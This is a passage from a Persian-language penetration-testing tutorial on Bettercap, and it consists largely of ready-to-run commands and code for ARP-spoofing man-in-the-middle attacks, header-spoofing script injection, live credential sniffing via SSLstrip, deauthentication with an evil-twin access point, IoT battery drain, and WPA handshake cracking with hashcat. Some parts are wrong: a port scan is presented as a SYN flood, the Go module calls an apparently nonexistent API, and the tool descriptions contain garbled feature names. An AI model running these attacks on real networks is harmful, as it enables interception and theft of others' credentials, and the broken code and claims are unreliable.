    Object.defineProperty(navigator, 'languages', {
        get: function() { return ['en-US', 'en']; },
        configurable: true
    });
    
    // Override XMLHttpRequest
    var originalXHROpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(method, url) {
        originalXHROpen.apply(this, arguments);
        this.setRequestHeader('Accept-Language', 'en-US,en;q=0.9');
        this.setRequestHeader('X-Forwarded-For', '8.8.8.8'); //Fake US IP
    };
    
    // Override Fetch API
    var originalFetch = window.fetch.bind(window);
    window.fetch = function(url, options) {
        options = options || {};
        options.headers = options.headers || {};
        
        if (typeof options.headers === 'object') {
            options.headers['Accept-Language'] = 'en-US,en;q=0.9';
            options.headers['X-Forwarded-For'] = '8.8.8.8';
        }
        
        return originalFetch(url, options);
    };
    
    console.log('[Geo Bypass] Ready');
})();
```

2. **روش ساده - مرحله دوم:** اجرای MITM با تزریق جاوا اسکریپت `/root/geo_bypass.js`
```sh
#Step 2: Run Bettercap with Script Injection (تزریق اسکریپت)
sudo bettercap -iface eth0

#In Bettercap Shell:
set arp.spoof.targets 192.168.1.5
arp.spoof on
set http.proxy.script /root/geo_bypass.js
http.proxy on
events.stream on
```
----------

**پیاده سازی روش پیچیده: ماژول سفارشی Bettercap به زبان Go (راه‌حل کامل و حرفه‌ای)**
1. **روش پیچیده - مرحله اول:** ساخت ماژول سفارشی Bettercap با Golang
```javascript
// File: geo_bypass_module.go
// ماژول سفارشی برای دور زدن محدودیت‌های جغرافیایی
// Custom Bettercap Module for Bypassing Geographic Restrictions

package main

import (
    "github.com/bettercap/bettercap/modules"
    "github.com/bettercap/bettercap/session"
    "github.com/bettercap/bettercap/modules/http_proxy"
    "net/http"
    "strings"
)

type GeoBypassModule struct {
    session    *session.Session
    targetLang string
    targetIP   string
}

func NewGeoBypassModule(s *session.Session) modules.Module {
    return &GeoBypassModule{
        session:    s,
        targetLang: "en-US,en;q=0.9",
        targetIP:   "8.8.8.8",  // Fake US IP
    }
}

func (m *GeoBypassModule) Name() string {
    return "geo.bypass"
}

func (m *GeoBypassModule) Description() string {
    return "Bypass Geographic Restrictions by Modifying HTTP Headers"
}

func (m *GeoBypassModule) Author() string {
    return "Security Research Team"
}

func (m *GeoBypassModule) Configure() error {
    // رهگیری تمام درخواست‌ها که از پراکسی عبور می‌کنند
    // Intercept all HTTP requests passing through proxy
    
    http_proxy.OnRequest(func(req *http.Request) {
        // Modify Accept-Language Header (تغییر هدر Accept-Language)
        req.Header.Set("Accept-Language", m.targetLang)
        
        
        // Modify X-Forwarded-For Header to hide real IP
        // تغییر هدر برای مخفی‌سازی آیپی واقعی
        req.Header.Set("X-Forwarded-For", m.targetIP)
        req.Header.Set("X-Real-IP", m.targetIP)
        
        // Remove CDN Geo Headers (حذف هدرهای موقعیت جغرافیایی CDN)
        req.Header.Del("CF-IPCountry")
        req.Header.Del("CF-IPCountry-Code")
        req.Header.Del("X-GeoIP-Country")
        req.Header.Del("X-GeoIP-City")
        req.Header.Del("X-GeoIP-Region")
        
        // Modify Referer for Consistency (تغییر Referer برای مطابقت)
        if req.Header.Get("Referer") != "" {
            referer := req.Header.Get("Referer")
            //  Remove Location Parameters from URL
            // حذف پارامترهای موقعیت از آدرس
            if strings.Contains(referer, "?") {
                referer = strings.Split(referer, "?")[0]
                req.Header.Set("Referer", referer)
            }
        }
    })
    
    return nil
}

func (m *GeoBypassModule) Start() error {
    return nil
}

func (m *GeoBypassModule) Stop() error {
    return nil
}

// Main Function for Module Loading (تابع اصلی برای بارگذاری ماژول)
var Module = NewGeoBypassModule
```

2. **روش پیچیده - مرحله دوم:** کامپایل و استفاده از ماژول Go
```sh
#Step 1: Install Prerequisites (گام ۱: نصب پیش‌نیازها)
sudo apt update
sudo apt install golang-go git build-essential

#Step 2: Download Bettercap Source (گام ۲: دریافت کد منبع Bettercap)
cd /tmp
git clone https://github.com/bettercap/bettercap.git
cd bettercap

#Step 3: Copy Custom Module (گام ۳: کپی ماژول سفارشی)
cp /path/to/geo_bypass_module.go modules/

#Step 4: Compile Module (گام ۴: کامپایل ماژول)
go build -buildmode=plugin -o /root/geo_bypass.so modules/geo_bypass_module.go

#Step 5: Run Bettercap with Module (گام ۵: اجرای ابزار با ماژول)
sudo bettercap -iface eth0

#In Bettercap Shell:
#Load Module (بارگذاری ماژول)
load /root/geo_bypass.so

#Activation (فعالسازی)
set arp.spoof.targets 192.168.1.5
arp.spoof on
http.proxy on
geo.bypass on

#Show Results (نمایش نتایج)
events.stream on
```
-------

- **پیاده سازی راه‌ حل جایگزین: استفاده از پراکسی واسط (Mitmproxy)**
	- در ابزار Mitmproxy میتوانیم اسکریپت های پایتونی را تزریق کنیم. برای پیاده سازی حمله این حمله نیاز به این ویژگی داریم، در واقع دور زدم محدودیت های جغرافیایی و تغییر هدر را با استفاده از تکه کد پایتون انجام میدهیم.
	- در آخر هم Bettercap را اجرا میکنیم و ترافیک آنرا به Mitmproxy هدایت (Redirect) میکنیم.
```sh
#Step 1: Install Mitmproxy (گام 1: نصب ابزار)
sudo apt install mitmproxy

#Step 2: Create Header Modification Script
#گام ۲: ایجاد اسکریپت تغییر هدر
cat > /root/geo_headers.py << 'EOF'
#Mitmproxy Script for Bypassing Geographic Restrictions

from mitmproxy import http

def request(flow: http.HTTPFlow) -> None:
    #Modify Accept-Language
    flow.request.headers["Accept-Language"] = "en-US,en;q=0.9"
    
    #Spoof Source IP
    flow.request.headers["X-Forwarded-For"] = "8.8.8.8"
    flow.request.headers["X-Real-IP"] = "8.8.8.8"
    
    #Remove CDN Location Headers
    geo_headers = ["CF-IPCountry", "CF-IPCountry-Code", "X-GeoIP-Country"]
    for header in geo_headers:
        if header in flow.request.headers:
            del flow.request.headers[header]
EOF

#Step 3: Run Mitmproxy (گام 3: اجرای ابزار با اسکریپت پایتون)
mitmproxy --mode transparent --showhost -s /root/geo_headers.py -p 8080 &

#Step 4: Run Bettercap and Redirect Traffic to Mitmproxy
sudo bettercap -iface eth0 -eval "
    set arp.spoof.targets 192.168.1.5;
    arp.spoof on;
    set http.proxy.port 8080;
    http.proxy on;
    events.stream on
"
```
###### Attack 17: Battery Exhaustion in IOT Devices
- **توضیحات:**
	- **هدف:** ارسال مداوم درخواست‌های ping یا probe به یک دستگاه باتری‌دار (مثل قفل هوشمند) برای تخلیه سریع باتری.
	- **پیش‌نیازها:** شناسایی IP دستگاه.

**گام‌های پیاده‌سازی:**
1. **مرحله اول:** شناسایی دستگاه IoT
```sh
net.probe on
net.show
```

2. **مرحله دوم:** اجرای پینگ مداوم با ticker
```sh
set ticker.commands "!ping -c 100 192.168.1.250" #IoT Device IP
set ticker.period 60
ticker on
```
###### Attack 18: Camera Down Attack
- **توضیحات:**
	- **هدف:** ایجاد اختلال در عملکرد و از کارانداختن دوربین‌ های مداربسته تحت شبکه (DoS).
	- **پیش‌نیازها:** شناسایی IP دوربین.

**گام‌های پیاده‌سازی:**
1. **مرحله اول:** اجرای SYN Flood علیه IP دوربین
```sh
sudo bettercap -iface eth0

#In Bettercap
set syn.scan.target 192.168.1.200  #Camera IP
set syn.scan.port 80
syn.scan on
```
###### Attack 19: Credential Sniffing (Real-Time Show)
- **توضیحات:**
	- **هدف:** مشاهده نام‌ های کاربری، کلمات عبور و کوکی‌ ها در لحظه.

**گام‌های پیاده‌سازی:**
1. **مرحله اول:** اجرای کامل MITM و فعال‌سازی نمایش زنده
```sh
sudo bettercap -iface eth0

#In Bettercap
set arp.spoof.targets 192.168.1.5
arp.spoof on
set net.sniff.filter "tcp port 80 or tcp port 21 or tcp port 110"
net.sniff on
http.proxy on
https.proxy on
events.stream on
```
اکنون تمامی اطلاعات حساسی که به صورت Plain Text یا از طریق SSLstrip رمزگشایی می‌شوند، در کنسول شما نمایش داده خواهند شد.

###### Attack 20: WiFi Attack - Deauthentication plus Evil Twin
- **توضیحات:**
	1. **هدف:** 
		1. قطع دسترسی کاربر شبکه وایرلس از AP بصورت دستی و اتصال آن به AP جعلی که تست نفوذگر ایجاد کرده است. 
	2. **کارکرد:**
		1. تست نفوذگر با ارسال تعداد زیادی بسته Deauth کاربر را مجبور میکند که از AP خود قطع اتصال کند(Deauthentication Attack)
		2. سپس یک AP جعلی دقیقا با مشخصات AP اصلی میسازد تا در اتصال مجددا کاربر به این AP جعلی متصل شود(Evil Twin Attacks)
		3. در نتیجه ترافیک های کاربر همگی به تست نفوذگر میرسند.
	3. **پیش نیاز ها:**
		- آداپتور Wi‑Fi با قابلیت **Monitor Mode** و پشتیبانی از **Packet Injection** 
		- کارت شبکه های برند Alfa برای این منظور تولید شده اند و از مدل های معروف آن میتوان به Alfa AWUS036ACH/ACM اشاره کرد.

**گام‌های پیاده‌سازی:**
1. **مرحله اول:** اجرای Bettercap روی کارت شبکه وایرلس
```sh
sudo bettercap -iface wlan0
```

2. **مرحله دوم:** فعال‌ سازی ماژول Wi‑Fi
	- حال باید Wi‑Fi module را فعال کرده و شبکه‌ها را اسکن کنید:
```sh
wifi.recon on
wifi.show
```
- ابزار Bettercap تمام AP ها و نقاط دسترسی وایرلسی اطراف را شناسایی‌ میکند و آنها را نمایش می‌دهد.

3. **مرحله سوم:** اجرای حمله Deauthentication با ماژول `wifi.deauth`
```sh
wifi.deauth <target_BSSID> [client_MAC]
```
- اگر فقط BSSID وارد شود، همه‌ی کلاینت‌های متصل به آن AP هدف قرار می‌گیرند.
- در صورت ذکر MAC کاربر، تنها همان کلاینت هدف قرار می‌گیرد.
- مثال:
```sh
wifi.deauth 00:11:22:33:44:55 FF:EE:DD:CC:BB:AA
```
در پشت صحنه، Bettercap فریم‌های Deauthentication را با Sender Address برابر با BSSID و Destination Address برابر با Client بصورت مداوم ارسال می‌کند.

4. **مرحله چهارم:** ترکیب Evil Twin در Deauthentication برای ساخت یک اکسس پوینت جعلی
```sh
set wifi.ap.ssid MyWiFi
set wifi.ap.bssid 00:11:22:33:44:55
set wifi.ap.channel 6
wifi.ap.on
```

5. **مرحله پنجم:** اجرای همزمان `wifi.deauth` روی AP واقعی
	- با اینکار کاربران به AP جعلی (Evil Twin) هدایت می‌شوند.

6. **مرحله ششم:** رهگیری و دستکاری ترافیک کاربران
	1. در ادامه میتوان با ماژول‌های نظیر `net.sniff` و `http.proxy` ترافیک کاربران را رهگیری، دستکاری یا ضبط نمود.
```sh
net.sniff on
http.proxy on
```

**توضیحات و نکات تکمیلی:**
- **سایر ابزار ها برای تست نفوذ شبکه های وایرلسی:**
	1. **استفاده از ابزار `Aircrack-ng Suite`**
		1. **توضیحات:**
			1. یکی از برترین ابزار ها برای پیاده سازی انواع حملات در شبکه های وایرلسی است. `Aircrack-ng` در واقع مجموعه ای از ابزار هاست که همگی در حملات شبکه های وایرلس استفاده میشوند.
		2. **مرحله اول: مانیتور شبکه های اطراف با `airmon-ng`**
			1. ابزار `airmon-ng` یک اسکریپت از بسته‌ `Aircrack‑ng` است که برای ورود به حالت **monitor** روی کارت‌ های WiFi استفاده می‌شود.
			2. از این دستور برای بدست آوردن BSSID, ESSID, Active Clients و ... شبکه های وایرلسی اطراف استفاده میشود.
			3. `sudo airmon-ng start wlan0`
		3. **مرحله دوم: اجرای Deauthentication Attack با `aireplay-ng`**
			1. ابزار `aireplay‑ng` با تولید ترافیک جعلی باعث قطع اتصال کاربر از شبکه وایرلسی میشود. در واقع این ابزار بطور خاص در حملات Deauthentication استفاده میشود.
			2. `aireplay-ng --deauth 10 -a <BSSID> -c <client> wlan0mon`
		4. **مرحله چهارم: ساخت AP جعلی(Evil Twin) با `airbase-ng`**
			1. ابزار `airbase-ng` برای ساخت نقاط دسترسی Access Point های جعلی استفاده میشود، بنابراین برای پیاده سازی حمله Evil Twin میتوانیم از این ابزار استفاده کنیم.
			2. `airbase-ng -e "TargetSSID" -c 6 wlan0mon`
	2. **ابزار های دیگر:**
		1. از ابزار های دیگری که برای پیاده سازی Deauth + Evil Twin استفاده میشود میتوان به مواردی مانند `Wifiphisher` ، `Fluxion` , ... اشاره کرد.
		2. **ابزار Fluxion**
			1. ابزاری آزمایش امنیت شبکه و مهندسی اجتماعی است که به‌عنوان یک نسخه‌ی بهبود یافته از `linset` توسط vk496 توسعه یافته و برای بررسی آسیب‌پذیری‌های شبکه‌های بی‌سیم طراحی شده است.
			2. ابزار Fluxion برای تست نفوذ پروتکل‌های WEP/WPA‑PSK، ارائه‌ی رابط کاربری گرافیکی و گزارش‌گیری به‌صورت کامل است.
			3. قابلیت‌های آن شامل «کلاچ»، «کلیک» و «فورک» برای استخراج گذرواژه‌ها و شناسایی نقاط ضعف در شبکه است.
			4. مخزن اصلی آن در GitHub قرار دارد و به‌روزرسانی‌های منظم دریافت می‌کند. لینک مخزن: https://github.com/fluxionnetwork/fluxion
			5. برای استفاده، باید یک کارت شبکه در حالت monitor و دسترسی‌های مدیریتی روی سیستم داشته باشید.
		3. **ابزار Wifiphisher:**
			1. ابزار Wifiphisher یک چارچوب Framework متن‌باز است. این ابزار از تکنیک های Phishing برای پیاده سازی حملات Evil Twin Deauth و تست نفوذ شبکه های وایرلسی استفاده میکند.
			2. در واقع ایجاد نقطه دسترسی جعلی (Evil Twin) به مهاجمان اجازه می‌دهد تا ‌صفحات فیشینگ را به دستگاه‌های متصل تزریق کنند و اطلاعات ورود را جمع‌آوری کنند.
			3. این ابزار به‌صورت خودکار حملات «association» و «phishing» را بر روی شبکه‌های Wi‑Fi اجرا می‌کند و به Penetration Testers(تست کنندگان نفوذ) امکان میدهد تا تهدیدات مربوط به شبکه‌های بی‌سیم را شناسایی کنند.
		4. **لیستی از سایر ابزارها:**
			1. ابزار Reaver: تست نفوذ پسوردهای WPS در روترهای بی‌سیم.
			2. ابزار Kismet: شناسایی و تحلیل شبکه‌های مخفی و دسترسی‌ناپذیر.
			3. ابزار Wifite: اسکریپت خودکار برای تست نفوذ بر شبکه‌های WEP/WPA‑PSK.
			4. ابزار Fern WiFi Cracker: ابزار جامع برای شناسایی آسیب‌پذیری‌ های WPA/WPA2.
###### Attack 21: WiFi Attack - Cracking WPA/WPA2 Handshakes
- **توضیحات:**
	- ماژول `wifi.handshakes` در Bettercap اجازه میدهد تا فرآیند شنود Handshake را به روش‌های مختلف انجام دهیم تا ضعف های شبکه وایرلس را در این زمینه پیدا و برطرف کنیم.

**گام‌های پیاده‌سازی:**
1. **مرحله اول:** شنود غیرفعال (Passive Sniffing)
	- بهترین حالت زمانی است که یک کلاینت جدید به AP متصل می‌شود. 
	- در این سناریو صرفاً با روشن کردن حالت Monitor و شروع شنود، بسته‌های Handshake را جمع‌آوری می‌کند.
```sh
sudo bettercap -iface wlan0mon 
set wifi.recon on 
wifi.show
#Start Passive Sniffing
set wifi.handshakes.passive true 
#Start Handshake Capturing
wifi.handshakes.start
```
- ابزار Bettercap به صورت خودکار بسته‌های Handshake را شناسایی و ذخیره می‌کند.

2. **مرحله دوم:** فعال‌سازی Handshake با Deauthentication Attack
	- در بیشتر مواقع، منتظر اتصال یک کلاینت جدید ماندن، عملی نیست. در این حالت، مهاجم با استفاده از حمله‌ی **Deauthentication** (که در بخش قبل توضیح داده شد)، کلاینت‌ های متصل را مجبور به قطع اتصال و سپس اتصال مجدد می‌کند. این کار باعث شروع مجدد فرآیند Four-Way Handshake می‌شود.
```sh
wifi.deauth <BSSID> [client_MAC]
```
- پس از اجرای Deauth و اتصال مجدد کاربر، Bettercap قادر به شنود Handshake خواهد بود.
- فایل‌های Handshake معمولاً با پسوند `.pcap` ذخیره شده و حاوی اطلاعاتی از جمله BSSID شبکه، آدرس MAC کلاینت، کانال و الگوریتم رمزنگاری هستند.

3. **مرحله سوم:** شبیه‌سازی شکستن رمز عبور (Password Cracking)
	- پس از به دست آوردن فایل `.pcap` حاوی Handshake، باید از ابزار های شکستن رمز عبور مانند `hashcat` یا `john` (John the Ripper) برای کرک کردن PSK استفاده ‌کنیم.
	- با اینکار میتوانیم متوجه شویم که پسورد های ما قابلیت شکسته شدن را دارند یا در مقابل حملات پایدار هستند.
	- فرآیند شکستن رمز های عبور، یک فرآیند چند مرحله ایست که در زیر مراحل آنرا توضیح میدهیم.

4. **مرحله چهارم:** آماده سازی لیست کلمات Wordlist
	- برای شکستن رمز عبور نیاز به یک لیست کلمات (wordlist) حاوی حدس‌ هایی از رمز عبور شبکه داریم.
	- سپس باید ابزار کرک رمز عبور را انتخاب کنیم. ابزار `hashcat` به دلیل پشتیبانی از GPU، سرعت بسیار بالاتری دارد و به همین دلیل پیشنهاد میشود از این ابزار استفاده شود.

5. **مرحله پنجم:** تبدیل فرمت Handshake (اگر لازم باشد)
	- ابزار `hashcat` نیاز به فرمت خاصی از Handshake دارد، بنابراین با استفاده از ابزارهایی مانند `cap2hccapx.py` یا `hcxpcapngtool` می‌توانیم فایل `.pcap` را به فرمت مناسب `.hccapx` یا `.22000` تبدیل کنیم.
	- در اینجا با `hcxpcapngtool` فایل فایل `.pcap` را فرمت `22000` تبدیل میکنیم.
```sh
hcxpcapngtool -o output.22000 input.pcap
```

6. **مرحله ششم:** اجرای حمله Brute-Force یا Dictionary Attack:
	- حمله **Dictionary Attack:** امتحان کردن رمزهای عبور از لیست کلمات.
	- حمله **Brute-Force Attack**: امتحان کردن تمام ترکیبات ممکن از  مجموعه ای از کاراکترهای مشخص شده.
	- هر دو این حملات برای یافتن رمزعبور از فایل Handshake تبدیل شده استفاده میشوند.
- **Dictionary Attack:**
```sh
hashcat -m 22000 -a 0 output.22000 wordlist.txt
#Flags Description:

#-m - Specific WPA/WPA2 Format => 22000
#-a - Specific Attack Type => 0 mean Dictionary Attack
```

- **Brute-Force Attack:**
```sh
hashcat -m 22000 -a 3 output.22000 ?a?a?a?a?a?a?a?a
#Flags Description:

#-m => Specific WPA/WPA2 Format => 22000
#-a => Specific Attack Type => 3 mean Brute-Force Attack

#?a?a?a?a?a?a?a?a => 
#?a => All type of Characters(0-9, a-z, A-Z, Special Chars)
#?a?a?a?a?a?a?a?a => Password is 8 Characters
```
- اگر رمز عبور در لیست کلمات یا در محدوده‌ی حمله‌ی Brute-Force باشد، `hashcat` آن را پیدا خواهد کرده و چاپ میکند.
##### Ettercap vs Bettercap - Final Battle
###### Compare Table

| **ویژگی**                 | **Ettercap**       | **Bettercap**             |
|:------------------------- |:------------------ |:------------------------- |
| سال تولید                 | سال 2001           | سال 2015                  |
| زبان برنامه نویسی         | زبان C             | زبان Go                   |
| رابط کاربری               | متنی/گرافیکی قدیمی | تعاملی Interactive Shell  |
| پشتیبانی HTTPS            | نیاز به ابزار جدا  | بله - ویژگی داخلی         |
| پشتیبانی HTTP2            | خیر                | بله                       |
| حملات WiFi                | فقط با پلاگین      | بله - ویژگی داخلی         |
| اسکریپت‌ نویسی - فیلتر ها | زبان C (پیچیده)    | زبان JavaScript (آسان تر) |
| ویژگی REST API            | ندارد              | دارد                      |
| حملات BLE                 | خیر                | بله                       |
| ماژولار بودن              | پلاگین محدود       | ماژولار کامل              |
| مصرف منابع                | کم                 | متوسط                     |
| پایداری                   | بسیار بالا         | بالا                      |
| جامعه کاربری              | بزرگ (قدیمی)       | رو به رشد (مدرن)          |
| یادگیری                   | متوسط              | آسان                      |
| مستندات                   | پراکنده            | عالی                      |
###### Final Compare Result  
- **برنده: Bettercap:** در سال 2025، Bettercap انتخاب برتر است زیرا:  
	1. **یادگیری آسان‌تر:** اگر تازه شروع می‌کنید، Bettercap را در 1 روز یاد می‌گیرید، Ettercap را در 1 هفته!  
	2. **انعطاف‌پذیری بیشتر:** معماری ماژولار Bettercap یعنی فقط آنچه نیاز دارید را فعال می‌کنید.  
	3. **حملات مدرن:** Bettercap با HTTPS/HTTP2 کار می‌کند. Ettercap در این زمینه ناتوان است.  
	4. **توسعه فعال:** Bettercap هر ماه آپدیت می‌شود، Ettercap تقریباً راکد است.  
	5. **ویژگی REST API:** می‌توانید Bettercap را در اتوماسیون‌ های خود استفاده کنید.

- **اما...** Ettercap را هم باید بشناسید! چون:
	1. هنوز روی سیستم‌ های قدیمی و Embedded کاربرد دارد.
	2. منابع کمتری مصرف می‌کند (روی Raspberry Pi عالی است).
	3. در آزمون‌ های CEH و OSCP از آن سوال می‌آید.
	4. فیلتر های C آن برای سناریوهای خاص قدرتمندتر است.

- **توصیه نهایی:** Bettercap را به عنوان ابزار اصلی یاد بگیرید، Ettercap را برای مواقع خاص بشناسید. البته این بازهم یک توصیه است.

##### Bettercap: Conclusion
- **REST API and Web UI:** 
	- ابزار Bettercap دارای یک API داخلی کامل است و میتوانید با فعال کردن `api.rest on` و `http.server on`، از طریق یک مرورگر وب حملات خود را کنترل و نتایج را مشاهده کنید. این ویژگی برای تیم‌های Red Team که نیاز به عملیات از راه دور دارند، حیاتی است.

- **Integrate with Metasploit:**
	- خروجی‌ های ترافیک PCAP تولید شده توسط `net.sniff` را می‌توان مستقیماً به Metasploit وارد کرد یا از ماژول‌های کمکی آن برای تحلیل استفاده نمود.
    
- **Bettercap in Blue Team:**
	- فراتر از یک ابزار تهاجمی؛ Bettercap یک ابزار قدرتمند پایش امنیت است. تیم‌های Blue Team می‌توانند از آن برای شبیه‌ سازی حملات داخلی، تست کارایی سیستم‌های تشخیص نفوذ (IDS) مانند Snort/Suricata و همچنین برای شنود و تحلیل ترافیک مشکوک در شبکه خود استفاده کنند.
    
- **Modular:**
	- معماری کاملاً ماژولار Bettercap به زبان Go، توسعه ماژول‌های شخصی و افزودن قابلیت‌های جدید را برای محققان امنیت بسیار ساده کرده است.
    
- **قدرت، مسئولیت می‌آورد** از این دانش تنها برای محافظت از دارایی‌های خود و با مجوز رسمی استفاده کنید.

### !